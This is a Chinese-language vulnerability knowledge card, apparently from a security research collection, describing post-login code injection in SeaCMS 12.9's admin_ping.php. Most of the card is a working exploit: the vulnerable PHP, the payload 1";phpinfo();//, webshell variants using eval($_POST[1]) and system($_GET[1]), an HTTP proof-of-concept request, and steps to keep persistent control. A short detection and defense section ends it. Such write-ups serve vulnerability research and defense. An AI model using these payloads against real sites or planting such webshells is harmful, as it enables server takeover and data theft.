---
id: web-php-rce-seacms-admin-ping-post-write-php-code
title: SeaCMS 12.9 后台 admin_ping.php 设置项未过滤拼接写入 data/admin/ping.php 导致代码执行
type: scenario
domain: web
path: web/php/rce
technique: seacms-admin-ping-config-write-php-code
aliases:
- 海洋CMS admin_ping getshell
- SeaCMS 后台写马
- 百度主动推送设置 RCE
- weburl 代码注入
- ping.php 写入 phpinfo
- SeaCMS 12.9 代码执行
tags:
- php
- seacms
- cms
- backend
- code-write
- rce
- webshell
- admin-panel
cve: []
severity: high
confidence: high
status: verified
affected_versions: SeaCMS 12.9（原文版本）
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-V278
  verified_at: '2026-11-08T00:48:49+08:00'
  notes: 已对照原文与 img/01-08 核对：admin_ping.php action=set 将 POST weburl/token 直接拼入 data/admin/ping.php，payload 1";phpinfo();// 生成代码与 phpinfo 截图一致；PoC/触发条件一致。未复跑目标；admin 目录名可按部署重命名。dedup 其余候选（pbootcms/cmseasy/dedecms 后台写 PHP）仅同大类，非同链。
---

## 一句话结论

SeaCMS 12.9 后台“百度主动推送设置”对应的 `admin_ping.php` 在 `action=set` 时把 `$_POST['weburl']` 和 `$_POST['token']` 原样拼进 PHP 代码字符串并写入 `../data/admin/ping.php`；把 `weburl` 提交为 `1";phpinfo();//` 之类的内容即可闭合字符串并在生成的 PHP 文件中注入任意代码，访问该文件即执行，形成后台 getshell。

## 原理

- 漏洞代码（原文）：
  ```php
  if($action=="set")
  {
     $weburl = $_POST['weburl'];
     $token  = $_POST['token'];
     $open = fopen("../data/admin/ping.php", "w");
     $str  = '<?php  ';
     $str .= '$weburl = "';
     $str .= "$weburl";
     $str .= '"; ';
     $str .= '$token = "';
     $str .= "$token";
     $str .= '"; ';
     $str .= " ?>";
     fwrite($open, $str);
     fclose($open);
     ShowMsg("成功保存设置!","admin_ping.php");
     exit;
  }
  ```
- 用户输入被直接拼进 `$weburl = "..."` / `$token = "..."` 的双引号字符串里，没有任何 `addslashes`/引号过滤：
  - 提交 `weburl = 1";phpinfo();//` 会生成：
    ```php
    <?php  $weburl = "1";phpinfo();//"; $token = "..."; ?>
    ```
    `//` 把后续的 `"; $token = ...` 注释掉，`phpinfo()` 在访问 `data/admin/ping.php` 时执行。
  - 也可写入任意 PHP 代码/一句话木马，例如 `1";eval($_POST[1]);//`。
- 写入目标 `data/admin/ping.php` 位于 Web 可访问的 `data/admin/` 目录（`data` 未被禁止访问时），因此写文件即得到可请求的 PHP 脚本；这属于“后台配置项被拼接进可执行 PHP 文件”的典型代码注入，而不是文件上传。
- 入口需要后台管理员会话（admin_ping.php 属于后台功能），但一旦进入后台即可稳定写马。

## 触发条件

- SeaCMS 12.9（原文版本；不同版本路径/字段可能变化）。
- 攻击者拥有后台管理员权限（或通过弱口令/其他后台漏洞获得会话）。
- `data/admin/` 目录可写且 Web 可直接访问（默认部署下成立）。
- 后台“百度主动推送设置”页面可访问（`admin_ping.php`，后台目录可能被重命名）。

## 利用步骤

1. 登录后台，打开“百度主动推送设置”页面（`admin_ping.php`）。
2. 在“网站域名”字段填入代码注入 payload：
   ```text
   1";phpinfo();//
   ```
   “准入密钥”可随意填 `1`。
3. 提交后，服务端生成 `data/admin/ping.php`，内容类似 `<?php $weburl = "1";phpinfo();//"; $token = "1"; ?>`。
4. 访问 `http(s)://target/data/admin/ping.php`，`phpinfo()` 执行（原文截图显示 PHP 7.3.4 的 phpinfo 页面），证明代码执行。
5. 把 payload 换成 `1";eval($_POST[1]);//` 或写入完整 webshell，即可持续控制；注意 `//` 注释掉尾部残留代码，避免语法错误。

## PoC

```http
POST /admin/admin_ping.php HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded

action=set&weburl=1%22%3Bphpinfo()%3B%2F%2F&token=1
```

随后访问：

```text
GET /data/admin/ping.php
```

生成的 `data/admin/ping.php` 核心内容：

```php
<?php  $weburl = "1";phpinfo();//"; $token = "1"; ?>
```

## 变体与关联

- 变体：`token` 字段同样未过滤，可单独或组合注入；写入的目录/文件名固定为 `data/admin/ping.php`，可覆盖为 webshell。
- 变体：如果 `//` 被过滤，可用 `/*` 或构造成合法 PHP 表达式（如 `";system($_GET[1]);/*`）。
- 关联：[[web-php-rce-pbootcms-backend-siteinfo-copy-webshell]]（另一 CMS 后台配置写入 PHP/缓存 getshell）、[[web-php-rce-cmseasy-cve-2021-42643-template-save-file-write]]（后台模板保存写文件）、[[web-php-rce-dedecms-field-tag-runphp-stored-injection]]（后台字段落盘后执行）等“后台写 PHP 代码”类卡。
- 注意：本文同篇还分析了 SeaCMS 12.9 的反射型 XSS、后台任意文件下载、后台 SQL 执行与未授权 SQLi，见关联卡/skipped。

## 检测与防御

- 代码修复：生成 PHP 文件时对用户输入使用 `var_export`/`addslashes` 并校验字符集，禁止把用户输入直接拼进可执行代码；更安全的做法是写入 `json`/`ini` 配置并由代码读取，而非生成 PHP。
- 权限：后台目录改名/加二次认证/IP 白名单；`data/` 目录禁止 PHP 解析（Nginx `location ^~ /data/ { deny all; }` 或禁止执行）。
- 检测：监控 `data/admin/ping.php` 的创建/修改（FIM）；审计后台 `weburl`/`token` 中出现引号、`phpinfo`、`eval`、`system` 等；检查 Web 访问日志中对 `data/admin/ping.php` 的请求。
- 清理：删除恶意 `ping.php`，排查后台账号与同目录其他写入文件，轮换管理员凭据。
